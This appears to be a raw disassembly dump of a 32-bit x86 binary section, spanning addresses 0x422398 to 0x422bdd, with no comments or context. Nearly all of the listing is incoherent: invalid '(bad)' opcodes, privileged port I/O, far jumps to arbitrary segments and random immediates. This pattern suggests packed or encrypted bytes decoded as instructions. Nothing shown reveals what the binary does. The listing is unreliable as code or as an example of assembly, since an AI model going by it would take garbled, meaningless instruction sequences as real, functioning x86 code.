  422398:	jo     0x42236e
  42239a:	div    ebp
  42239c:	mov    bh,0xa5
  42239e:	jno    0x4223ad
  4223a0:	pop    ebx
  4223a1:	mov    eax,ds:0xe47eb9e6
  4223a6:	mov    ebx,DWORD PTR [ebx-0x50]
  4223a9:	sub    eax,eax
  4223ab:	push   ds
  4223ac:	out    0x16,al
  4223ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223af:	in     eax,dx
  4223b0:	pop    es
  4223b1:	adc    BYTE PTR [edx-0x3c217ba4],bh
  4223b7:	icebp  
  4223b8:	or     al,0x5b
  4223ba:	mov    eax,DWORD PTR [ebx]
  4223bc:	lods   eax,DWORD PTR ds:[esi]
  4223bd:	dec    ebp
  4223be:	cs inc eax
  4223c0:	stc    
  4223c1:	push   ecx
  4223c2:	or     DWORD PTR [ebx-0x7],ecx
  4223c5:	pop    ss
  4223c6:	dec    edx
  4223c7:	or     edx,DWORD PTR [esi+0x3a]
  4223ca:	push   ss
  4223cb:	leave  
  4223cc:	sub    eax,0xaeab531e
  4223d1:	mov    ebx,0xf3a7b37
  4223d6:	and    eax,0x2df7629f
  4223db:	daa    
  4223dc:	inc    ebx
  4223dd:	or     al,0xc9
  4223df:	lds    esp,FWORD PTR [eax]
  4223e1:	cli    
  4223e2:	mov    dh,0x9c
  4223e4:	cs jp  0x4223c2
  4223e7:	shr    DWORD PTR [edi+0x44],0x5d
  4223eb:	aaa    
  4223ec:	mov    WORD PTR [ebx-0x27e130c6],?
  4223f2:	sbb    ah,al
  4223f4:	scas   eax,DWORD PTR es:[edi]
  4223f5:	push   esi
  4223f6:	push   esi
  4223f7:	sbb    eax,ebp
  4223f9:	push   esi
  4223fa:	(bad)  
  4223fb:	push   esp
  4223fc:	or     BYTE PTR [ecx+0x3c71dbe1],0xb3
  422403:	stos   BYTE PTR es:[edi],al
  422404:	cmp    cl,BYTE PTR [ebx]
  422406:	test   DWORD PTR [eax+0x5e],esi
  422409:	xlat   BYTE PTR ds:[ebx]
  42240a:	call   0xced697a9
  42240f:	nop
  422410:	xor    bh,dl
  422412:	mov    ebp,0x1ae37f41
  422417:	clc    
  422418:	stos   DWORD PTR es:[edi],eax
  422419:	jp     0x4223b1
  42241b:	dec    esp
  42241c:	dec    ebx
  42241d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42241e:	push   edx
  42241f:	clc    
  422420:	inc    eax
  422421:	icebp  
  422422:	cmc    
  422423:	add    al,0x73
  422425:	scas   eax,DWORD PTR es:[edi]
  422426:	mul    BYTE PTR [ebp+edx*4+0x19]
  42242a:	fst    DWORD PTR [esi+0x5d59ba46]
  422430:	push   0x804ee477
  422435:	call   esi
  422437:	mov    edx,0x46d3f85
  42243c:	mov    dl,0x25
  42243e:	mov    ecx,0x874e9c24
  422443:	repz inc ebp
  422445:	hlt    
  422446:	jl     0x42241b
  422448:	mov    ebx,0x5d74458c
  42244d:	ret    0x22bd
  422450:	sbb    eax,0x81a95c6d
  422455:	enter  0xcc43,0xd1
  422459:	mov    ds:0xf7c23788,eax
  42245e:	xor    edi,DWORD PTR [ecx+0x1e0ad51b]
  422464:	pop    edx
  422465:	shr    DWORD PTR [ebp+esi*4+0x48],1
  422469:	mov    bl,0x43
  42246b:	out    dx,al
  42246c:	mov    ecx,DWORD PTR [ebx-0x137572c8]
  422472:	pushf  
  422473:	addr16 xchg ebp,eax
  422475:	out    0x30,eax
  422477:	iret   
  422478:	mov    bh,0x9f
  42247a:	sbb    eax,0xbdd2e448
  42247f:	pop    esi
  422480:	test   al,0x4
  422482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422483:	(bad)  
  422484:	mov    eax,0x6a3b6c41
  422489:	dec    ebp
  42248a:	push   ecx
  42248b:	int3   
  42248c:	sub    edi,DWORD PTR [edi+0x9]
  42248f:	jle    0x42242a
  422491:	loopne 0x422443
  422493:	test   al,0xba
  422495:	push   eax
  422496:	dec    edx
  422497:	push   esi
  422498:	jp     0x4224ab
	...
  422512:	add    BYTE PTR [eax],al
  422514:	(bad)  
  422515:	stc    
  422516:	out    0xe3,eax
  422518:	(bad)  
  422519:	inc    edi
  42251b:	std    
  42251c:	fidivr WORD PTR [ebx]
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	dec    esp
  422520:	dec    esi
  422521:	jg     0x4224b6
  422523:	pop    ebp
  422524:	stc    
  422525:	mov    ebx,0x76e0001
  42252a:	add    BYTE PTR [eax],al
  42252c:	fisub  DWORD PTR [eax+0x66]
  42252f:	jno    0x42254d
  422531:	rcl    al,1
  422533:	pop    esi
  422534:	cdq    
  422535:	int    0x6b
  422537:	sbb    dh,0xbd
  42253a:	cmp    ebp,ebp
  42253c:	jmp    0xa5a2:0x81094722
  422543:	jnp    0x42258a
  422545:	call   0xcd6a0e9b
  42254a:	jmp    0xfe41:0x19f448ac
  422551:	or     DWORD PTR [ebx+ebx*4-0x80],edi
  422555:	adc    edx,DWORD PTR [ecx+0x13b2090c]
  42255b:	jecxz  0x422507
  42255d:	dec    eax
  42255e:	pushf  
  42255f:	push   ss
  422560:	inc    ecx
  422561:	xchg   DWORD PTR gs:[ebx],eax
  422564:	xchg   BYTE PTR [edi-0x1f],cl
  422567:	dec    edi
  422568:	loope  0x4224f8
  42256a:	or     BYTE PTR [esi-0x80],0x6a
  42256e:	fsub   QWORD PTR [eax+0x2e]
  422571:	push   ecx
  422572:	add    esp,DWORD PTR [eax+0x3c]
  422575:	ror    DWORD PTR [edx-0x51a05ec4],cl
  42257b:	xlat   BYTE PTR ds:[ebx]
  42257c:	repnz push 0x77
  42257f:	xor    eax,0x63526a79
  422584:	jne    0x42256d
  422586:	dec    esi
  422587:	mov    al,0x3d
  422589:	stos   DWORD PTR es:[edi],eax
  42258a:	and    al,bl
  42258c:	pop    ebp
  42258d:	arpl   WORD PTR [ebp-0x1a04c91f],di
  422593:	mov    ch,0xc1
  422595:	scas   al,BYTE PTR es:[edi]
  422596:	mov    edi,0xe260f2e
  42259b:	mov    edx,0x843957e1
  4225a0:	sub    DWORD PTR [ebx-0x69],0x8782cf58
  4225a7:	push   0x8245eea
  4225ac:	aas    
  4225ad:	cmc    
  4225ae:	sub    ecx,esi
  4225b0:	lahf   
  4225b1:	lock jbe 0x42254f
  4225b4:	ret    
  4225b5:	xor    BYTE PTR [edi],0x9f
  4225b8:	je     0x4225e7
  4225ba:	mov    bl,0xdb
  4225bc:	adc    eax,DWORD PTR [eax]
  4225be:	mov    DWORD PTR [edi-0x7d],ecx
  4225c1:	pop    ecx
  4225c2:	inc    ebx
  4225c3:	push   0x85eaa6b
  4225c8:	ror    DWORD PTR [ebp-0x5b55b0e3],0xed
  4225cf:	(bad)  
  4225d0:	clc    
  4225d1:	pop    ds
  4225d2:	jb     0x4225a4
  4225d4:	push   0xffffffc1
  4225d6:	sbb    BYTE PTR [ebx],ch
  4225d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225d9:	xchg   esi,eax
  4225da:	sub    ch,BYTE PTR [ebx]
  4225dc:	loop   0x422650
  4225de:	jmp    0xd036:0x34e06cdd
  4225e5:	jmp    0xe7f2cad2
  4225ea:	mov    cl,0xfc
  4225ec:	and    ch,ah
  4225ee:	les    ebx,FWORD PTR [edi+0x5c7cbeef]
  4225f4:	dec    esp
  4225f5:	repz dec edx
  4225f7:	mov    al,ds:0xe98f70bf
  4225fc:	xor    edi,DWORD PTR [ecx+eiz*8+0x6]
  422600:	idiv   DWORD PTR [edx+0x5b]
  422603:	into   
  422604:	(bad)  
  422605:	popf   
  422606:	or     eax,0x290e3e7f
  42260b:	arpl   WORD PTR [edx+0x77bdaba2],ax
  422611:	sbb    BYTE PTR [eax+edx*2-0x52d9fad9],cl
  422618:	push   edx
  422619:	ss cmp eax,0x54683a03
  42261f:	rcl    BYTE PTR [ecx],1
  422621:	mov    al,ds:0xe4e2b89c
  422626:	xchg   si,ax
  422628:	cld    
  422629:	adc    BYTE PTR [ebp+0x5a48c57d],ch
  42262f:	xchg   esi,eax
  422630:	pop    esi
  422631:	or     eax,0xe9b1eab5
  422636:	idiv   BYTE PTR [esi]
  422638:	mov    DWORD PTR [ebx-0x7bf59fd2],ebp
  42263e:	jae    0x4225e7
  422640:	arpl   WORD PTR [ebp+0x4ebfd8da],dx
  422646:	fwait
  422647:	in     al,0x3
  422649:	stos   DWORD PTR es:[edi],eax
  42264a:	or     ecx,DWORD PTR [edi]
  42264c:	sbb    DWORD PTR [eax+0x66f502a8],esi
  422652:	pop    edi
  422653:	cmp    BYTE PTR [esp+ecx*8],dl
  422656:	leave  
  422657:	xor    al,0x52
  422659:	cld    
  42265a:	enter  0x276c,0xa4
  42265e:	mov    ebx,0x29dee72d
  422663:	mov    ecx,0x56f9cb4d
  422668:	and    cl,BYTE PTR [esi+0x60423311]
  42266e:	jbe    0x422648
  422670:	in     al,dx
  422671:	inc    eax
  422672:	adc    dh,bh
  422674:	inc    ecx
  422675:	add    ah,BYTE PTR gs:[ebp-0x14dfd3ea]
  42267c:	in     al,0xa1
  42267e:	gs adc edx,eax
  422681:	push   es
  422682:	sbb    ebx,DWORD PTR ds:0x2238f6e6
  422688:	stc    
  422689:	in     eax,dx
  42268a:	aam    0xee
  42268c:	pop    ss
  42268d:	cld    
  42268e:	mov    BYTE PTR [edi],bl
  422690:	push   ebp
  422691:	mov    ch,0x4f
  422693:	or     BYTE PTR [eax-0x28],cl
  422696:	dec    esi
  422697:	jae    0x422718
  422699:	adc    DWORD PTR [eax-0x206cd724],0x5a9b1da8
  4226a3:	lock add DWORD PTR [ebp-0x1a6f9894],0x40037fcc
  4226ae:	sbb    eax,0x662e215c
  4226b3:	mov    bh,0xdd
  4226b5:	lea    ebx,[ecx+0x4ba70d85]
  4226bb:	retf   0xecc
  4226be:	lahf   
  4226bf:	ins    BYTE PTR es:[edi],dx
  4226c0:	cli    
  4226c1:	push   esp
  4226c2:	inc    edx
  4226c3:	fist   DWORD PTR [esi]
  4226c5:	mov    ch,0x1a
  4226c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226c8:	dec    ecx
  4226c9:	(bad)  
  4226ca:	unpckhps xmm5,XMMWORD PTR [edx+0x414194d8]
  4226d1:	jmp    0x422667
  4226d3:	push   0xfffffffd
  4226d5:	ins    BYTE PTR es:[edi],dx
  4226d6:	pop    eax
  4226d7:	lods   eax,DWORD PTR ds:[esi]
  4226d8:	xchg   edx,eax
  4226d9:	and    esi,DWORD PTR [ebp-0x11]
  4226dc:	bound  esi,QWORD PTR [edi]
  4226de:	sbb    BYTE PTR [edi],0xea
  4226e1:	pand   mm2,QWORD PTR [eax+edx*2]
  4226e5:	into   
  4226e6:	and    DWORD PTR [esi-0x4040f483],ecx
  4226ec:	adc    BYTE PTR [esp+edi*1+0x30],ah
  4226f0:	call   0x339c6905
  4226f5:	and    ah,BYTE PTR [eax+eax*8]
  4226f8:	cmp    ebp,esi
  4226fa:	add    eax,DWORD PTR [eax-0xa]
  4226fd:	lahf   
  4226fe:	mov    es,WORD PTR [ebp+0x5a13fb69]
  422704:	icebp  
  422705:	cvtps2pi mm1,xmm7
  422708:	mov    al,0xae
  42270a:	shl    esi,1
  42270c:	stos   DWORD PTR es:[edi],eax
  42270d:	lahf   
  42270e:	jecxz  0x422768
  422710:	sub    eax,0xca27b2ad
  422715:	pop    es
  422716:	xchg   edx,eax
  422717:	mov    ah,0x16
  422719:	cmp    al,BYTE PTR [ebx]
  42271b:	iret   
  42271c:	ins    DWORD PTR es:[edi],dx
  42271d:	add    DWORD PTR [edx+0x391bb71],esi
  422723:	mov    es,WORD PTR [eax-0x7d5c8dde]
  422729:	or     DWORD PTR [ebp-0x6b],0x973bff02
  422730:	in     al,0x7b
  422732:	mov    eax,0x516aaeef
  422737:	push   ds
  422738:	mov    edx,0x6bce27ec
  42273d:	inc    edx
  42273e:	inc    eax
  42273f:	or     dh,ch
  422741:	outs   dx,BYTE PTR ds:[esi]
  422742:	adc    ch,BYTE PTR [ecx]
  422744:	cmp    edx,eax
  422746:	mov    edi,0xb39db99
  42274b:	adc    DWORD PTR [eax],esi
  42274d:	pop    edx
  42274e:	mov    ah,0x7d
  422750:	repz fst DWORD PTR [edx-0x16]
  422754:	sbb    al,0xc
  422756:	ins    DWORD PTR es:[edi],dx
  422757:	maxps  xmm3,XMMWORD PTR [ebx-0x6a3666be]
  42275e:	add    BYTE PTR [edx],ah
  422760:	fs hlt 
  422762:	add    al,0xff
  422764:	stc    
  422765:	dec    ebp
  422766:	neg    DWORD PTR [ecx+edi*4+0x7634a4d3]
  42276d:	mov    esi,DWORD PTR [edi-0x6b]
  422770:	daa    
  422771:	sbb    al,0x54
  422773:	pop    ecx
  422774:	and    DWORD PTR [ebx],ecx
  422776:	cs push es
  422778:	retf   0xd9ac
  42277b:	xor    bh,bl
  42277d:	sahf   
  42277e:	mov    ebp,ebx
  422780:	jge    0x42275f
  422782:	bound  ecx,QWORD PTR [ecx]
  422784:	cmp    esp,DWORD PTR gs:[eax+0x70f56094]
  42278b:	add    BYTE PTR [eax],0xe9
  42278e:	clc    
  42278f:	(bad)  
  422790:	jl     0x4227ca
  422792:	xchg   edi,eax
  422793:	xlat   BYTE PTR ds:[ebx]
  422794:	mov    ebx,0x399b5736
  422799:	fs xor bh,0xb7
  42279d:	add    eax,0xe4faa92e
  4227a2:	inc    ebx
  4227a3:	push   eax
  4227a4:	daa    
  4227a5:	ret    
  4227a6:	pop    eax
  4227a7:	inc    esp
  4227a8:	mov    edx,0x50f98fcc
  4227ad:	test   DWORD PTR [ecx+ebx*2+0x18ef70cd],esi
  4227b4:	test   eax,0xd2698536
  4227b9:	sbb    DWORD PTR [eax+eax*2+0x77c1213],esp
  4227c0:	add    DWORD PTR [ecx+0x1c],esi
  4227c3:	sbb    eax,0x9825cb3d
  4227c8:	or     dl,al
  4227ca:	outs   dx,BYTE PTR ds:[esi]
  4227cb:	jb     0x422806
  4227cd:	popf   
  4227ce:	jbe    0x422803
  4227d0:	jg     0x422799
  4227d2:	xchg   DWORD PTR [edx-0x33],ebp
  4227d5:	pop    edx
  4227d6:	or     ecx,DWORD PTR [edi+0x7e]
  4227d9:	push   ebx
  4227da:	cmp    BYTE PTR [eax+0x54b5612b],ch
  4227e0:	in     eax,0xf8
  4227e2:	mov    ah,BYTE PTR [esi+0x22]
  4227e5:	dec    eax
  4227e6:	ret    0xa689
  4227e9:	iret   
  4227ea:	enter  0xe334,0x41
  4227ee:	ret    0xbb65
  4227f1:	es jge 0x4227fd
  4227f4:	push   0x74ff6bf4
  4227f9:	cmp    dl,BYTE PTR [ebp-0x6]
  4227fc:	repnz or bl,BYTE PTR [ebp-0x1b]
  422800:	xor    eax,0x16148b70
  422805:	xchg   ebx,eax
  422806:	jp     0x4227aa
  422808:	addr16 addr16 aad 0x52
  42280c:	jmp    0xd5ed:0xd401b77c
  422813:	imul   esi,DWORD PTR [edi-0x54],0x3d
  422817:	xchg   ebx,eax
  422818:	push   ds
  422819:	fwait
  42281a:	sti    
  42281b:	cmp    eax,0x9c349145
  422820:	add    dl,0xaa
  422823:	arpl   WORD PTR [ebx-0x80],bx
  422826:	daa    
  422827:	and    cl,BYTE PTR [esi+0x76ac5ce4]
  42282d:	cmp    DWORD PTR [edx],edi
  42282f:	not    BYTE PTR [eax]
  422831:	mov    dl,0xb8
  422833:	push   es
  422834:	into   
  422835:	outs   dx,BYTE PTR ds:[esi]
  422836:	lahf   
  422837:	push   eax
  422838:	scas   eax,DWORD PTR es:[edi]
  422839:	repz and eax,0x1be01a9
  42283f:	and    BYTE PTR [ecx],al
  422841:	push   0x28
  422843:	xchg   esp,eax
  422844:	les    esp,FWORD PTR [eax+esi*4]
  422847:	pop    eax
  422848:	loope  0x42286c
  42284a:	and    edi,esp
  42284c:	iret   
  42284d:	imul   ebx,DWORD PTR [ecx],0xfffffff5
  422850:	dec    esp
  422851:	mov    ah,0xd0
  422853:	cmp    cl,BYTE PTR [ebp+0x56]
  422856:	in     eax,dx
  422857:	addr16 retf 
  422859:	test   DWORD PTR [edx],ebx
  42285b:	mov    ecx,0xca19ac72
  422860:	sub    eax,DWORD PTR [ebp+0x43dd1c4]
  422866:	inc    edx
  422867:	xchg   esp,eax
  422868:	mov    ebp,0xf1c43a71
  42286d:	adc    eax,0x9ca3aeb1
  422872:	add    esi,DWORD PTR [esi+0x57]
  422875:	loopne 0x4228a6
  422877:	loopne 0x42289a
  422879:	retf   
  42287a:	cli    
  42287b:	jne    0x422892
  42287d:	adc    dh,bl
  42287f:	ins    DWORD PTR es:[edi],dx
  422880:	rol    BYTE PTR [edx*4-0x63fecf8c],1
  422887:	pusha  
  422888:	add    dl,BYTE PTR ds:0xa16f2e06
  42288e:	sub    ch,0xd8
  422891:	pop    edi
  422892:	cwde   
  422893:	fisub  WORD PTR [esi-0xc]
  422896:	mov    eax,0x64704ee8
  42289b:	inc    esp
  42289c:	lods   al,BYTE PTR ds:[esi]
  42289d:	sbb    eax,0x1bfefbd3
  4228a2:	cmp    eax,0x934d3a5c
  4228a7:	adc    ecx,ecx
  4228a9:	mov    dh,0xb1
  4228ab:	jecxz  0x4228b6
  4228ad:	fisttp DWORD PTR [edx+0x198fc856]
  4228b3:	and    BYTE PTR [ebp-0xe74f9f1],0xdf
  4228ba:	mov    al,ds:0xec0afacf
  4228bf:	push   ds
  4228c0:	repnz loopne 0x4228ba
  4228c3:	or     al,BYTE PTR [edx]
  4228c5:	test   al,0x4a
  4228c7:	imul   ebx,DWORD PTR [ebx-0x2f19a1d0],0xb2210435
  4228d1:	adc    DWORD PTR [eax-0x6225d76],ebx
  4228d7:	ret    
  4228d8:	popf   
  4228d9:	jae    0x4228a7
  4228db:	les    ebp,FWORD PTR [edx]
  4228dd:	cwde   
  4228de:	mov    BYTE PTR [ecx+eiz*8],dh
  4228e1:	jmp    0x100f35b5
  4228e6:	xchg   ebp,eax
  4228e7:	cli    
  4228e8:	jge    0x422909
  4228ea:	daa    
  4228eb:	xchg   edx,eax
  4228ec:	jg     0x422945
  4228ee:	mov    cl,0x79
  4228f0:	lods   eax,DWORD PTR ds:[esi]
  4228f1:	cli    
  4228f2:	pop    eax
  4228f3:	popa   
  4228f4:	sub    dl,ch
  4228f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228f7:	(bad)  
  4228f8:	or     BYTE PTR [esi],bh
  4228fa:	sub    al,BYTE PTR [esi-0x3d70078c]
  422900:	and    eax,0xdcf9325e
  422905:	repnz add DWORD PTR [ecx],0x2d
  422909:	out    0x3c,al
  42290b:	mov    ds,WORD PTR [eax-0x21f0bf61]
  422911:	mov    BYTE PTR [eax],bl
  422913:	adc    eax,0x270855e3
  422918:	push   ebx
  422919:	fld    QWORD PTR [ebx]
  42291b:	(bad)  
  42291c:	repz sbb edi,DWORD PTR [eax]
  42291f:	jbe    0x4228d5
  422921:	adc    edi,DWORD PTR [edx-0x58]
  422924:	and    ebx,esp
  422926:	sub    BYTE PTR [edx+0x6dc93f5d],ah
  42292c:	xlat   BYTE PTR ds:[ebx]
  42292d:	mov    ah,0x25
  42292f:	shl    BYTE PTR [ecx+0x3d],1
  422932:	sti    
  422933:	cmp    cl,ah
  422935:	stc    
  422936:	inc    ecx
  422937:	xchg   ebp,eax
  422938:	int3   
  422939:	jmp    0x1c7f1b20
  42293e:	mov    ecx,0x374dc47a
  422943:	scas   eax,DWORD PTR es:[edi]
  422944:	sub    al,0xe0
  422946:	mov    BYTE PTR [eax+0x7e],0xb2
  42294a:	mov    ebp,0x3029f571
  42294f:	inc    eax
  422950:	lods   al,BYTE PTR ds:[esi]
  422951:	mov    DWORD PTR [ecx+ebp*4],esp
  422954:	dec    edx
  422955:	jp     0x422954
  422957:	lea    esp,[ecx-0x56]
  42295a:	lods   eax,DWORD PTR ds:[esi]
  42295b:	sbb    DWORD PTR [ecx+0x63],ebp
  42295e:	push   ss
  42295f:	mov    ebx,0x8b800f5e
  422964:	or     esi,edi
  422966:	scas   eax,DWORD PTR es:[edi]
  422967:	add    BYTE PTR [edx+0x3d0a366f],ah
  42296d:	sub    eax,0x1a64f761
  422972:	popf   
  422973:	scas   al,BYTE PTR es:[edi]
  422974:	pop    ecx
  422975:	or     eax,0xb925a88
  42297a:	test   eax,0xf98e684c
  42297f:	ret    0x485e
  422982:	cli    
  422983:	adc    DWORD PTR [ebp+0x5986c447],edi
  422989:	xor    BYTE PTR [esi],ah
  42298b:	ins    BYTE PTR es:[edi],dx
  42298c:	mov    bh,0xab
  42298e:	ret    
  42298f:	mov    cl,0xbe
  422991:	out    0x28,al
  422993:	int3   
  422994:	inc    eax
  422995:	dec    esi
  422996:	pop    es
  422997:	pop    ds
  422998:	stos   BYTE PTR es:[edi],al
  422999:	xlat   BYTE PTR ds:[ebx]
  42299a:	adc    al,0x16
  42299c:	pushf  
  42299d:	xchg   esi,eax
  42299e:	cmp    WORD PTR [ebp+0x2d5282fc],cx
  4229a5:	sbb    BYTE PTR [esi+ebp*4-0x5bf4c6e6],0x24
  4229ad:	fadd   DWORD PTR [edi+0x23]
  4229b0:	retf   
  4229b1:	dec    eax
  4229b2:	ja     0x42293e
  4229b4:	js     0x422954
  4229b6:	dec    esi
  4229b7:	xchg   ebx,eax
  4229b8:	adc    BYTE PTR cs:[esi],0x92
  4229bc:	pop    ds
  4229bd:	lods   al,BYTE PTR ds:[esi]
  4229be:	mov    cl,0xae
  4229c0:	sbb    edx,ebx
  4229c2:	(bad)  
  4229c3:	xor    eax,0xe00802a4
  4229c8:	bound  ebx,QWORD PTR [ebp-0x18]
  4229cb:	ss pop ebp
  4229cd:	aad    0x88
  4229cf:	ins    DWORD PTR es:[edi],dx
  4229d0:	mov    eax,0xe2b979dc
  4229d5:	popa   
  4229d6:	mov    dh,0x52
  4229d8:	std    
  4229d9:	mov    bl,0x55
  4229db:	push   es
  4229dc:	push   edi
  4229dd:	je     0x4229f0
  4229df:	add    edi,DWORD PTR [eax+eiz*2+0x3b8a05f6]
  4229e6:	test   al,0xf2
  4229e8:	lods   eax,DWORD PTR ds:[esi]
  4229e9:	mov    BYTE PTR [eax-0x68d7f84f],al
  4229ef:	scas   eax,DWORD PTR es:[edi]
  4229f0:	dec    ecx
  4229f1:	(bad)  
  4229f3:	ss out dx,al
  4229f5:	repnz int 0x67
  4229f8:	mov    ebx,0x590a51da
  4229fd:	sub    al,ah
  4229ff:	or     BYTE PTR [ebp+0x5d],cl
  422a02:	pop    ss
  422a03:	in     al,0xd1
  422a05:	fnstcw WORD PTR ds:0xd76763e7
  422a0b:	imul   edi,DWORD PTR [esi+0x75],0x802c8f5f
  422a12:	mov    bl,0xb0
  422a14:	push   esp
  422a15:	pop    ds
  422a16:	nop
  422a17:	dec    ecx
  422a18:	fld    QWORD PTR [eax]
  422a1a:	sub    ebx,DWORD PTR [ecx-0x1f]
  422a1d:	gs inc eax
  422a1f:	loop   0x422a21
  422a21:	mov    WORD PTR [ecx-0x60],fs
  422a24:	ins    DWORD PTR es:[edi],dx
  422a25:	jge    0x4229e7
  422a27:	retf   0x99e5
  422a2a:	ins    DWORD PTR es:[edi],dx
  422a2b:	sub    eax,0x90c73d12
  422a30:	fidivr DWORD PTR [edi+0x71]
  422a33:	xchg   esi,eax
  422a34:	sti    
  422a35:	or     eax,0xd4cb0536
  422a3a:	jmp    0x497838b4
  422a3f:	jbe    0x422a02
  422a41:	or     bh,ah
  422a43:	cwde   
  422a44:	ins    DWORD PTR es:[edi],dx
  422a45:	push   ecx
  422a46:	ins    DWORD PTR es:[edi],dx
  422a47:	pop    edx
  422a48:	test   dl,bh
  422a4a:	imul   edx,DWORD PTR [ebx+eax*4-0x28],0x64c0c21a
  422a52:	test   al,0x79
  422a54:	jl     0x422a30
  422a56:	ins    BYTE PTR es:[edi],dx
  422a57:	dec    esp
  422a58:	xchg   ebp,eax
  422a59:	pop    ebx
  422a5a:	adc    eax,0xa1448e83
  422a5f:	pusha  
  422a60:	mov    ebp,0x9adcc328
  422a65:	sahf   
  422a66:	sar    esp,1
  422a68:	mov    eax,ds:0x52139817
  422a6d:	jmp    DWORD PTR [ecx-0x11e591ca]
  422a73:	or     ecx,esi
  422a75:	mov    ds:0x939be3f4,al
  422a7a:	shl    ebx,1
  422a7c:	push   eax
  422a7d:	rcl    ebp,cl
  422a7f:	jge    0x422a62
  422a81:	sbb    DWORD PTR ds:0x355ec2c4,0xadb95e59
  422a8b:	jne    0x422acc
  422a8d:	test   BYTE PTR [ebx],ch
  422a8f:	jle    0x422a11
  422a91:	je     0x422ab5
  422a93:	xadd   esp,ebp
  422a96:	jmp    0x43a8:0xe3702ce9
  422a9d:	aam    0xda
  422a9f:	push   edi
  422aa0:	arpl   si,ax
  422aa2:	fs (bad) 
  422aa5:	call   0x294ad187
  422aaa:	sub    al,0x65
  422aac:	xor    ebp,DWORD PTR [ebp+0x22c0b0e7]
  422ab2:	jl     0x422aa6
  422ab4:	(bad)  [edi]
  422ab6:	scas   al,BYTE PTR es:[edi]
  422ab7:	inc    ecx
  422ab8:	dec    edx
  422ab9:	cmc    
  422aba:	xchg   edi,eax
  422abb:	xchg   ebp,eax
  422abc:	sub    edi,DWORD PTR [edx-0x35]
  422abf:	ffree  st(0)
  422ac1:	xor    ebx,DWORD PTR [esp+ebx*1-0x6]
  422ac5:	cmp    al,0xa9
  422ac7:	lock mov dl,0xc3
  422aca:	ret    
  422acb:	push   ebp
  422acc:	jg     0x422a94
  422ace:	mov    WORD PTR [edx],es
  422ad0:	push   0x6b
  422ad2:	xchg   edx,eax
  422ad3:	repnz mov bh,0x99
  422ad6:	daa    
  422ad7:	(bad)
  422ada:	jno    0x422af0
  422adc:	push   ecx
  422add:	loop   0x422aab
  422adf:	dec    esi
  422ae0:	repnz and BYTE PTR [edi],ch
  422ae3:	popf   
  422ae4:	not    dh
  422ae6:	pop    eax
  422ae7:	loop   0x422b66
  422ae9:	adc    esi,DWORD PTR [ecx]
  422aeb:	sub    edi,DWORD PTR [ebx+0x37]
  422aee:	or     BYTE PTR [edx],0xe4
  422af1:	popf   
  422af2:	mov    dh,0xc3
  422af4:	pop    ss
  422af5:	dec    ebx
  422af6:	mov    ecx,0x262998e
  422afb:	loop   0x422a9e
  422afd:	int    0x94
  422aff:	je     0x422ad6
  422b01:	sbb    DWORD PTR [ebx-0x21373feb],eax
  422b07:	mov    ds:0x2fb835f5,al
  422b0c:	aaa    
  422b0d:	add    eax,ebx
  422b0f:	dec    edi
  422b10:	lahf   
  422b11:	pusha  
  422b12:	push   cs
  422b13:	fidiv  WORD PTR [ecx+0x7a]
  422b16:	mov    ebx,0xf2ce0b31
  422b1b:	jae    0x422aec
  422b1d:	lods   eax,DWORD PTR ds:[esi]
  422b1e:	mov    dh,0xe5
  422b20:	push   ds
  422b21:	cwde   
  422b22:	outs   dx,BYTE PTR ds:[esi]
  422b23:	sbb    ebx,ebx
  422b25:	xor    al,0xb
  422b27:	gs jle 0x422ba1
  422b2a:	(bad)  
  422b2b:	iret   
  422b2c:	xchg   ebx,eax
  422b2d:	and    eax,0xa6e7c3dd
  422b32:	test   eax,0xcd32f3f3
  422b37:	and    ebx,DWORD PTR [eax+0x6bdb030c]
  422b3d:	out    dx,eax
  422b3e:	or     eax,0xac6555b4
  422b43:	loope  0x422af4
  422b45:	stos   DWORD PTR es:[edi],eax
  422b46:	cli    
  422b47:	or     ecx,DWORD PTR [esi]
  422b49:	or     BYTE PTR [ebp+ebp*4+0x3dd487a3],bl
  422b50:	jb     0x422ad4
  422b52:	icebp  
  422b53:	inc    esi
  422b54:	cdq    
  422b55:	retf   0x473d
  422b58:	es mov ebx,0xb5518592
  422b5e:	call   0x83896071
  422b63:	dec    ecx
  422b64:	iret   
  422b65:	sahf   
  422b66:	jno    0x422b63
  422b68:	adc    bl,BYTE PTR [esi]
  422b6a:	and    BYTE PTR [ecx+0x55f4bdba],dh
  422b70:	xchg   DWORD PTR [esi+ebx*8],esp
  422b73:	or     dh,ah
  422b75:	or     ebp,DWORD PTR [esi]
  422b77:	push   esi
  422b78:	xchg   edi,eax
  422b79:	cmp    BYTE PTR [ebp-0x5b],0xfe
  422b7d:	push   edi
  422b7e:	cmp    bl,0x97
  422b81:	jne    0x422b43
  422b83:	mov    WORD PTR [ebx+0x73d8012f],?
  422b89:	repnz adc BYTE PTR ds:0x6c6a1630,cl
  422b90:	test   al,0x4c
  422b92:	or     edi,DWORD PTR [ebp+0x3f]
  422b95:	aaa    
  422b96:	lods   al,BYTE PTR ds:[esi]
  422b97:	sbb    DWORD PTR [ebx+0x11],edi
  422b9a:	push   cs
  422b9b:	jl     0x422b40
  422b9d:	ds xchg edx,eax
  422b9f:	(bad)  
  422ba0:	gs inc eax
  422ba2:	push   ebx
  422ba3:	mov    esp,0xeb74e4dc
  422ba8:	inc    ebp
  422ba9:	leave  
  422baa:	jo     0x422bc9
  422bac:	das    
  422bad:	icebp  
  422bae:	retf   
  422baf:	outs   dx,DWORD PTR ds:[esi]
  422bb0:	jp     0x422b7e
  422bb2:	push   esp
  422bb3:	and    BYTE PTR fs:[ebx+0x68373720],0x4d
  422bbb:	call   0x377c9dd6
  422bc0:	pushf  
  422bc1:	cmp    bh,BYTE PTR [ebp-0x18]
  422bc4:	xor    ebp,esp
  422bc6:	mov    WORD PTR [edi],gs
  422bc8:	nop
  422bc9:	mov    ah,0x7
  422bcb:	test   al,0x5
  422bcd:	pop    eax
  422bce:	sbb    BYTE PTR [ebx+edx*1],dl
  422bd1:	imul   edx,esi,0x870995e3
  422bd7:	mov    cl,0xfe
  422bd9:	adc    edi,ecx
  422bdb:	or     al,0xf8
  422bdd:	fdiv   DWORD PTR [edx]
